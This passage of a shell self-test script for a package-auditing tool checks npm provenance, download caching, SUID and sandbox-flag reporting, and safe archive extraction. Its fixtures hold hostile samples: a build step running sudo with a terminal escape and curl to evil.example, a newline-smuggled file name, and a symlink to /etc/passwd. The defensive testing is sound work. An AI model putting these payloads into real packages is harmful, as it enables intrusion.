r.sources = [src]
a._digest_url_multi = lambda url, algs, cache_path=None: {
    x: {"sha256sums": sha256, "sha512sums": sha512hex, "sha1sums": sha1hex}[x] for x in algs}
a.npm_packument = lambda url: ({"package": "@scope/pkg", "version": "1.0.0",
                                "integrity": integrity, "shasum": sha1hex,
                                "signatures": [{}]}, "")
a.npm_verify_signatures = lambda meta: (True, "npm registry signatures 1/1 verified")
a.verify_sources(r, {}, "/tmp", remote=True)
expected = ("npm @scope/pkg@1.0.0: sha512 integrity matches, sha1 shasum matches, "
            "npm registry signatures 1/1 verified")
raise SystemExit(0 if src.provenance == expected and not r.findings else 1)
PY

python3 - "$here/audit.py" <<'PY' || { fail_msg "npm provenance mismatch"; }
import base64, importlib.util, sys
spec = importlib.util.spec_from_file_location("audit", sys.argv[1])
a = importlib.util.module_from_spec(spec)
sys.modules["audit"] = a
spec.loader.exec_module(a)
url = "https://registry.npmjs.org/@scope/pkg/-/pkg-1.0.0.tgz"
sha256, sha512hex, sha1hex = "b" * 64, "c" * 128, "d" * 40
integrity = "sha512-" + base64.b64encode(bytes.fromhex("e" * 128)).decode()
r = a.Report(package="demo")
src = a.Source(raw=url, url=url, line=7, scheme="https", vcs=False, sig=False, patch=False)
src.resolved = url
src.filename = "pkg-1.0.0.tgz"
src.sums = {"sha256sums": sha256}
r.sources = [src]
a._digest_url_multi = lambda url, algs, cache_path=None: {
    x: {"sha256sums": sha256, "sha512sums": sha512hex, "sha1sums": sha1hex}[x] for x in algs}
a.npm_packument = lambda url: ({"package": "@scope/pkg", "version": "1.0.0",
                                "integrity": integrity, "shasum": sha1hex,
                                "signatures": [{}]}, "")
a.npm_verify_signatures = lambda meta: (True, "npm registry signatures 1/1 verified")
a.verify_sources(r, {}, "/tmp", remote=True)
bad = [f for f in r.findings if f.code == "provenance-mismatch" and f.severity == "HIGH"]
raise SystemExit(0 if len(bad) == 1 else 1)
PY

# --- a cached download is verified without touching the network -------------
python3 - "$here/audit.py" <<'PY' || { fail_msg "download cache reuse"; }
import hashlib, importlib.util, os, sys, tempfile
spec = importlib.util.spec_from_file_location("audit", sys.argv[1])
a = importlib.util.module_from_spec(spec)
sys.modules["audit"] = a
spec.loader.exec_module(a)
with tempfile.TemporaryDirectory() as tmp:
    data = b"cached payload"
    name = "cached.tgz"
    url = f"https://example.org/{name}"
    with open(os.path.join(tmp, name), "wb") as f:
        f.write(data)
    with open(os.path.join(tmp, name + ".url"), "w") as f:
        f.write(url + "\n")
    r = a.Report(package="demo")
    src = a.Source(raw=url, url=url,
                   line=3, scheme="https", vcs=False, sig=False, patch=False)
    src.resolved = src.url
    src.filename = name
    src.sums = {"sha256sums": hashlib.sha256(data).hexdigest()}
    r.sources = [src]
    a.urllib.request.urlopen = lambda *args, **kwargs: (_ for _ in ()).throw(
        AssertionError("network used despite cache"))
    counts = a.verify_sources(r, {}, "/tmp", remote=True, cache_dir=tmp)
    raise SystemExit(0 if counts == (0, 1) and src.verify == "verified" else 1)
PY

# --- an unattributed same-named cache file is never hashed or deleted -------
python3 - "$here/audit.py" <<'PY' || { fail_msg "foreign cache file handling"; }
import hashlib, importlib.util, os, sys, tempfile
spec = importlib.util.spec_from_file_location("audit", sys.argv[1])
a = importlib.util.module_from_spec(spec)
sys.modules["audit"] = a
spec.loader.exec_module(a)
with tempfile.TemporaryDirectory() as tmp:
    data = b"someone else's payload"
    name = "other.tgz"
    path = os.path.join(tmp, name)
    with open(path, "wb") as f:
        f.write(data)
    r = a.Report(package="demo")
    url = f"https://example.org/{name}"
    src = a.Source(raw=url, url=url, line=3, scheme="https",
                   vcs=False, sig=False, patch=False)
    src.resolved = src.url
    src.filename = name
    src.sums = {"sha256sums": hashlib.sha256(b"expected").hexdigest()}
    r.sources = [src]
    a.urllib.request.urlopen = lambda *args, **kwargs: (_ for _ in ()).throw(
        a.urllib.error.URLError("offline"))
    a.verify_sources(r, {}, "/tmp", remote=True, cache_dir=tmp)
    mismatch = [f for f in r.findings if f.code == "checksum-mismatch"]
    raise SystemExit(0 if not mismatch and os.path.isfile(path) else 1)
PY

# --- package inventory reports shipped SUID, launchers, and .INSTALL -------
python3 - "$tmp/inspect-demo.tar.gz" <<'PY' || fail_msg "inspect fixture creation"
import io, sys, tarfile
path = sys.argv[1]
with tarfile.open(path, "w:gz") as t:
    def add(name, data, mode):
        info = tarfile.TarInfo(name)
        info.size = len(data)
        info.mode = mode
        info.mtime = 0
        t.addfile(info, io.BytesIO(data))
    add(".PKGINFO", b"pkgname = demo\npkgver = 1-1\nlicense = MIT\n", 0o644)
    add(".INSTALL", b"post_install() { :; }\n", 0o644)
    add("usr/bin/demo", b'#!/bin/sh\nexec /opt/demo --no-sandbox "$@"\n', 0o4755)
    add("usr/bin/demo\nevil", b'#!/bin/sh\nexec /opt/demo --no-sandbox "$@"\n', 0o755)
    add("usr/share/applications/demo.desktop",
        b"[Desktop Entry]\nExec=/usr/bin/demo\n# --no-sandbox is unsafe\n", 0o644)
PY
inspect_out=$(python3 "$here/inspect_pkg.py" "$tmp/inspect-demo.tar.gz" 2>&1)
echo "$inspect_out" | grep -q 'setuid/setgid:' || fail_msg "inspect missing SUID section"
echo "$inspect_out" | grep -q 'usr/bin/demo' || fail_msg "inspect missing SUID path"
echo "$inspect_out" | grep -q -- '--no-sandbox' || fail_msg "inspect missing sandbox flag"
echo "$inspect_out" | grep -q 'sha256=unreadable' && fail_msg "inspect could not read an escaped member"
echo "$inspect_out" | grep -q '.INSTALL: present' || fail_msg "inspect missed .INSTALL"
# demo + the newline-named launcher carry the flag; the desktop comment must not.
[ "$(echo "$inspect_out" | grep -c 'flags:')" = 2 ] || fail_msg "inspect sandbox flag count"

# --- per-architecture .SRCINFO arrays are compared, not silently dropped ----
mkdir -p "$tmp/arch_srcinfo"
cat > "$tmp/arch_srcinfo/PKGBUILD" <<'PKG'
pkgname=arch_srcinfo
pkgver=1
pkgrel=1
arch=('x86_64' 'aarch64')
license=('MIT')
source_x86_64=('https://example.org/a.tar.gz')
source_aarch64=('https://example.org/b.tar.gz')
sha256sums_x86_64=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
sha256sums_aarch64=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
depends_x86_64=('glibc' 'extra-dep')
package(){ :; }
PKG
cat > "$tmp/arch_srcinfo/.SRCINFO" <<'SRC'
pkgbase = arch_srcinfo
	pkgver = 1
	pkgrel = 1
	arch = x86_64
	arch = aarch64
	license = MIT
	depends_x86_64 = glibc
	source_x86_64 = https://example.org/a.tar.gz
	sha256sums_x86_64 = e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
	source_aarch64 = https://example.org/b.tar.gz
	sha256sums_aarch64 = e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
SRC
want_code arch_srcinfo 0
want_finding arch_srcinfo srcinfo-stale

# --- snapshot links are validated and refused with a clean error -----------
python3 - "$here/audit.py" "$tmp/link.tar.gz" <<'PY' || fail_msg "snapshot link handling"
import importlib.util, io, sys, tarfile, tempfile
spec = importlib.util.spec_from_file_location("audit", sys.argv[1])
a = importlib.util.module_from_spec(spec)
sys.modules["audit"] = a
spec.loader.exec_module(a)
path = sys.argv[2]
with tarfile.open(path, "w:gz") as t:
    info = tarfile.TarInfo("pkg/abs")
    info.type = tarfile.SYMTYPE
    info.linkname = "/etc/passwd"
    t.addfile(info)
with tempfile.TemporaryDirectory() as tmp, tarfile.open(path) as t:
    try:
        a.safe_extract(t, tmp)
    except SystemExit:
        raise SystemExit(0)
    except Exception:
        raise SystemExit(1)
raise SystemExit(1)
PY

# --- control characters in package text are escaped in the human report -----
mkdir -p "$tmp/escaped"
python3 - "$tmp/escaped/PKGBUILD" <<'PY'
import sys
open(sys.argv[1], "w").write(
    "pkgname=escaped\npkgver=1\npkgrel=1\narch=('x86_64')\nlicense=('MIT')\n"
    "source=('https://example.org/a.tar.gz')\n"
    "sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')\n"
    "build() { sudo \\x1b]0;PWNED\\x07 curl http://evil.example/x; }\n"
    "package(){ :; }\n")
PY
want_code escaped 2
want_text escaped '\\x1b'

# --- usage errors are not HIGH findings -------------------------------------
python3 "$here/audit.py" > /dev/null 2>&1
[ "$?" = 64 ] || fail_msg "usage exit is not 64"

[ "$fail" = 0 ] && echo "selftest: PASS"
exit "$fail"
